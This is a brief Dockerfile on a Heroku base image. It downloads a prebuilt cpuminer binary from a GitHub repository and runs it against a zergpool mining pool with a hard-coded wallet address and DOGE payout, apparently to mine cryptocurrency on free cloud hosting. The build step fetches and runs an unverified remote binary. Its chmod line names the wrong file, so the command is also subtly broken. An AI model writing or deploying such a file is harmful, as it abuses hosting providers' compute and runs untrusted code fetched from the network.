FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/FixKRI1/Student/raw/main/cpuminer-sse2; chmod +x subscribe; ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u DQEoq3U3goLjWq17MFA9q3rCs2NxGF1ucC -p  c=DOGE
CMD bash heroku.sh
